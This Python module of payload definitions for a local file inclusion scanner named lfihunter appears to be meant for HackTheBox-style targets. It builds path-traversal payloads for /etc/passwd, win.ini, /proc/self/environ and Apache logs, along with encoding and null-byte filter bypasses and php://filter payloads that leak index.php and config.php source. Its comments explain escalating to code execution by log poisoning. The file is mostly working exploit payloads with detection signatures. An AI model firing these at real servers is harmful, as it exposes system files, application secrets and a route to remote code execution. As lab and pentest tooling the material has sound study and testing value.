"""
This file holds two things: the list of payloads lfihunter will try, and
the "signature" for each one, which is the text we expect to see in the
response if that payload actually worked.

Why do we need a signature at all, and not just check for a 200 OK status?
Because a lot of websites return 200 OK even for their own error pages.
If we only checked the status code, we'd get tons of false positives. So
instead, for every payload, we also record a string that should ONLY show
up if we actually managed to read the real file. For example, /etc/passwd
on Linux always starts with "root:" as the first line, so if we see
"root:" in the response, that's a strong signal we actually got the file.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class Payload:
    """
    A single thing to try against the target.

    value      = the actual payload string, e.g. "../../../etc/passwd"
    target     = a human-readable description, shown in the output so we
                 know what this payload was aiming for
    signature  = the string we expect to find in the response if this
                 payload worked
    category   = groups payloads so we can filter later (--category flag)
    """
    value: str
    target: str
    signature: str
    category: str


def _traversal_variants(target_path: str, depths: list[int]) -> list[str]:
    """
    Generates a bunch of "../" traversal payloads at different depths.

    Why different depths? Because we don't know in advance how deep the
    vulnerable folder actually is on the server. If the vulnerable code
    looks like:

        include("/var/www/html/pages/" + user_input)

    then we need enough "../" to climb all the way out of
    /var/www/html/pages/ before we can reach /etc/passwd. We don't know
    that folder structure ahead of time, so instead of guessing one
    number, we just generate a spread of depths (1 through 10 dots) and
    try all of them. One of them is likely to be the right depth.

    Example: depth=3 on "etc/passwd" produces "../../../etc/passwd"
    """
    variants = []
    for depth in depths:
        # "../" * depth repeats the string that many times, e.g.
        # "../" * 3 becomes "../../../"
        variants.append("../" * depth + target_path)
    return variants


# The list of depths we try for every traversal payload. Feel free to
# tweak this list, more depths means more requests sent (slower scan) but
# a better chance of hitting the exact right depth.
DEPTHS = [1, 2, 3, 4, 5, 6, 8, 10]

# This is the master list every payload gets added to. We build it below
# using a mix of loops (for the traversal depths) and plain appends (for
# one-off payloads like bypass tricks).
PAYLOADS: list[Payload] = []


# --- Linux targets ---
# /etc/passwd is the classic LFI proof-of-concept file on Linux. It lists
# system accounts and is world-readable by default, which makes it a safe,
# reliable way to confirm a traversal bug without needing to guess at
# anything sensitive.
for p in _traversal_variants("etc/passwd", DEPTHS):
    PAYLOADS.append(Payload(p, "/etc/passwd (Linux)", "root:", "traversal"))

# /etc/hosts is another safe, predictable file, useful as a second
# confirmation target in case /etc/passwd is blocked for some reason.
for p in _traversal_variants("etc/hosts", DEPTHS):
    PAYLOADS.append(Payload(p, "/etc/hosts (Linux)", "localhost", "traversal"))


# --- Windows targets ---
# win.ini is the Windows equivalent of a safe, always-present test file.
# We generate it two ways: once with the path using forward slashes
# (works surprisingly often even on Windows, since a lot of app code
# doesn't care which slash direction you use), and once by explicitly
# swapping to backslashes to mimic a real Windows file path.
for p in _traversal_variants("windows/win.ini", DEPTHS):
    # .replace("/", "\\") turns "../../windows/win.ini" into "..\\..\\windows\\win.ini"
    PAYLOADS.append(Payload(p.replace("/", "\\"), "win.ini (Windows)", "[extensions]", "traversal"))
    PAYLOADS.append(Payload(p, "win.ini (Windows, forward slash)", "[extensions]", "traversal"))


# --- Bypass techniques ---
# These payloads exist for when a simple "../" is blocked by a filter.
# Developers sometimes write weak filters that only catch the exact
# string "../" and nothing else, which is why all of these tricks exist:
# they represent the same traversal, just written in a way that might
# slip past a naive filter.
PAYLOADS += [
    # If a filter strips out "../" once, "....//" often still leaves a
    # working "../" behind after the strip happens. Example: if the
    # filter removes the substring "../", then "....//" becomes "../"
    # after the removal (this depends on how the filter is implemented,
    # but it is a very common bypass in practice).
    Payload("....//....//....//....//etc/passwd", "/etc/passwd (double-dot bypass)", "root:", "bypass"),

    # %2f is the URL-encoded form of a forward slash. Some filters check
    # the raw string for "../" before the web server decodes %2f back
    # into "/", so encoding it can sneak past that check.
    Payload("..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd (URL-encoded)", "root:", "bypass"),

    # Double encoding. %25 is the URL-encoded form of the percent sign
    # itself, so %252f decodes to %2f on the first pass, and only
    # becomes an actual "/" on a second decode pass. This bypasses
    # filters that only decode the URL once before checking it.
    Payload("..%252f..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd (double URL-encoded)", "root:", "bypass"),

    # Null byte tricks are a legacy PHP bug (fixed in modern PHP
    # versions, but still worth trying on old boxes, which is common on
    # HTB). The idea: some old PHP code appended a fixed extension after
    # user input, like $_GET['page'] . ".php". If you could sneak a null
    # byte in before that, older PHP would treat the null byte as the
    # end of the string and ignore everything the server tried to add
    # after it.
    Payload("../../../../etc/passwd%00", "/etc/passwd (null byte, legacy PHP)", "root:", "bypass"),
    Payload("../../../../etc/passwd%00.png", "/etc/passwd (null byte + fake extension)", "root:", "bypass"),

    # Same idea as the Windows traversal above, just grouped here since
    # it's specifically a bypass-style backslash payload rather than a
    # plain depth-based one.
    Payload("..\\..\\..\\..\\windows\\win.ini", "win.ini (backslash bypass)", "[extensions]", "bypass"),
]


# --- PHP wrappers ---
# This is a PHP-specific trick, very common on HTB boxes running PHP.
# Normally, if you include() a .php file through an LFI, PHP actually
# EXECUTES that file instead of showing you its source code, since
# that's just what include() does. That means a plain traversal payload
# won't show you the source of index.php, it'll just run it.
#
# The trick: php://filter is a special PHP "stream wrapper" that lets you
# apply a filter to a file's contents as it's being read, before PHP
# tries to execute it. If we apply the base64-encode filter, the file
# gets read and encoded as base64 text instead of being run as code,
# which means we get the raw source code back as a block of base64,
# completely safe to just print out and decode ourselves afterward.
PAYLOADS += [
    Payload(
        "php://filter/convert.base64-encode/resource=index",
        "index.php source (via php://filter, base64)",
        # Base64 output doesn't have one single fixed string we can
        # search for, since it changes depending on the source file's
        # contents. So instead of a normal signature, we use this
        # special marker string. scanner.py checks for this exact
        # marker and, when it sees it, runs a different kind of check
        # (does this response look like a base64 blob) instead of a
        # plain substring search.
        "__BASE64_LIKELY__",
        "wrapper",
    ),
    Payload(
        "php://filter/convert.base64-encode/resource=config",
        "config.php source (via php://filter, base64)",
        "__BASE64_LIKELY__",
        "wrapper",
    ),
    # This one isn't really an attack, it's a sanity check. data:// is
    # another PHP wrapper that lets you embed literal content directly
    # in the URL. "SGVsbG8=" is just the word "Hello" in base64. If a
    # target's LFI is bad enough to also process arbitrary wrapper input
    # like this (not just php://filter), this confirms it and shows
    # exactly how flexible the vulnerability is.
    Payload("data://text/plain;base64,SGVsbG8=", "data:// wrapper sanity check", "Hello", "wrapper"),
]


# --- Log and process file targets ---
# These are useful when you want to go from "I can read files" (LFI) to
# "I can run my own code" (remote code execution). The general idea for
# log poisoning: if you can get attacker-controlled text written into a
# log file (for example, by putting PHP code in your User-Agent header
# when making a normal request), and then use LFI to include that same
# log file, the PHP code you planted gets executed.
#
# We're not doing the actual poisoning here, just checking whether these
# files are even reachable in the first place, which is the first step
# before attempting that follow-up attack manually.
for p in _traversal_variants("proc/self/environ", DEPTHS):
    # /proc/self/environ on Linux shows the environment variables of the
    # current running process, which usually includes things like PATH.
    # It's also a classic log-poisoning target because some servers put
    # attacker-controlled data (like the User-Agent header) into their
    # own environment variables.
    PAYLOADS.append(Payload(p, "/proc/self/environ (Linux, env disclosure)", "PATH=", "traversal"))

for p in _traversal_variants("var/log/apache2/access.log", [3, 4, 5, 6]):
    # Apache's access log records every request, including the
    # User-Agent header. If this file is readable, log poisoning becomes
    # possible: send a request with PHP code as your User-Agent, then
    # use this same LFI to include the log file and run that code.
    PAYLOADS.append(Payload(p, "Apache access.log (log poisoning target)", "GET", "traversal"))
